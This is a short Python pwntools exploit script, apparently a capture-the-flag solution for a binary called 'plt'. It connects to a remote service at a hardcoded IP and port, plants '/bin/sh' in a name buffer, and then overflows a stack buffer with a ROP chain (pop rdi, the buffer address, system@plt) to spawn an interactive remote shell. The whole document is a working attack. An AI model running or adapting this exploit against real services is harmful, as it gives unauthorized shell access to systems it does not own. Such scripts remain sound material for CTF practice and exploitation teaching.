#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./plt"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2120)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x0400664
    c
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'


rbp = p64(0x12334)

c.sendafter('What your name?', '/bin/sh')

debug_gadget = p64(0x400677)


rop = b''
rop += p64(0x0000000000400773) # pop rdi ; ret
rop += p64(elf.symbols['name'])
rop += p64(elf.plt['system'])
# rop += debug_gadget

c.sendafter('say :)', b'a' * 0x30 + rbp + rop)

c.interactive()
c.close()
